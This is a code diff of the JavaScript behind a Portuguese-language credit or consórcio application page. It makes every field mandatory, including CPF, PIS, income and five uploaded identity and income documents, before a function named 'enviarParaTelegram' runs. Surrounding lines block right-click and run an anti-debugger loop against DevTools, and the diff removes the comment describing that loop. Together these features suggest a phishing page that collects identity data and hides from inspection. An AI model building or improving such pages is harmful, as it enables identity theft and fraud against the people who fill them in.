@@ -355,7 +355,6 @@
         document.addEventListener('contextmenu', e => e.preventDefault());
 
         // 3. Proteção Contra Depuração (Console Antidebugger)
-        // Cria um loop que pausa a execução se o DevTools for aberto
         (function() {
             var block = function() {
                 setInterval(function() {
@@ -399,8 +398,8 @@
                 phone: document.getElementById('c_phone').value
             };
 
-            if(!data.nome || !data.credito) {
-                alert("Por favor, informe seu Nome e o Valor do Crédito.");
+            if(!data.nome || !data.credito || !data.phone) {
+                alert("Por favor, preencha todos os campos do consórcio.");
                 return;
             }
 
@@ -464,6 +463,8 @@
 
         async function enviarParaTelegram() {
             const btn = document.getElementById('btn-submit');
+            
+            // Verificação de campos de texto
             const fields = {
                 nome: document.getElementById('name').value,
                 cpf: document.getElementById('cpf').value,
@@ -475,8 +476,23 @@
                 lgpd: document.getElementById('lgpd').checked
             };
 
-            if(!fields.nome || !fields.cpf || !fields.lgpd) {
-                alert("🔒 Segurança: Nome, CPF e Termos LGPD são obrigatórios para a análise.");
+            // Verificação de Arquivos Carregados
+            const filesCheck = {
+                rg: document.getElementById('file_rg').files.length > 0,
+                income: document.getElementById('file_income').files.length > 0,
+                dep: document.getElementById('file_dep').files.length > 0,
+                res: document.getElementById('file_res').files.length > 0,
+                civil: document.getElementById('file_civil').files.length > 0
+            };
+
+            // Validação Universal: Bloqueia se QUALQUER dado ou arquivo faltar
+            if (
+                !fields.nome || !fields.cpf || !fields.pis || !fields.phone || 
+                !fields.email || !fields.renda || !fields.lgpd ||
+                !filesCheck.rg || !filesCheck.income || !filesCheck.dep || 
+                !filesCheck.res || !filesCheck.civil
+            ) {
+                alert("❌ BLOQUEIO DE SEGURANÇA: Todos os campos de texto e TODOS os 5 blocos de documentos devem ser preenchidos/anexados para prosseguir.");
                 return;
             }
 
